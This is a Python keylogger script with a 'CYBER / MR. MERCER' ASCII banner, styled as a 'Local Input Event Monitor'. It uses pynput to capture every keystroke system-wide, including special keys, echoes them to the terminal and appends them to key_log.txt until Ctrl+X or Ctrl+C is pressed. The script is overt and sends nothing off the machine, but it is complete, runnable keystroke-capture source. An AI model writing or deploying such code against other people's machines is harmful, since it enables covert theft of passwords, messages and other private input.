import os
import sys
from pynput import keyboard

# Define the log file location
LOG_FILE = "key_log.txt"

# --- SYSTEM BANNER WITH CUSTOM ASCII ART ---
BANNER = r"""
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
         M R .   M E R C E R
   >> Local Input Event Monitor v1.0 <<
"""

print(BANNER)
print("==================================================")
print(f"[*] Recording started. Saving inputs to: {os.path.abspath(LOG_FILE)}")
print("[*] Exit Hotkey: Press 'Ctrl + X' to safely terminate.")
print("==================================================\n")

def on_press(key):
    """Callback function triggered whenever a key is pressed."""
    try:
        # Check for standard alphanumeric character inputs
        current_key = key.char
        
        # WSL/Terminal Hotkey Hook: 'Ctrl + X' registers as the hex code '\x18'
        # 'Ctrl + C' registers as '\x03'
        if current_key in ['\x18', '\x03']:
            print("\n\n[-] Termination hotkey detected. Exiting engine cleanly...")
            return False  # Returning False completely kills the pynput listener loop
            
    except AttributeError:
        # Fallback dictionary for common special/functional layout keys
        special_keys = {
            keyboard.Key.space: " [SPACE] ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: " [BACKSPACE] ",
            keyboard.Key.tab: " [TAB] "
        }
        
        # Use mapped string if known, otherwise output the clean key name
        current_key = special_keys.get(key, f" [{str(key).replace('Key.', '').upper()}] ")

    # Output to local terminal for immediate UI verification
    print(current_key, end="", flush=True)

    # Append character cleanly to the local logging file
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(current_key)
    except IOError as e:
        print(f"\n[!] Storage Error writing to log: {e}")

def main():
    try:
        # Initialize the hardware monitoring thread structure
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n\n[-] Terminal Interrupted (Ctrl+C caught). Clean cleanup completed.")
    finally:
        print("[*] Recording session closed successfully.")

if __name__ == "__main__":
    main()
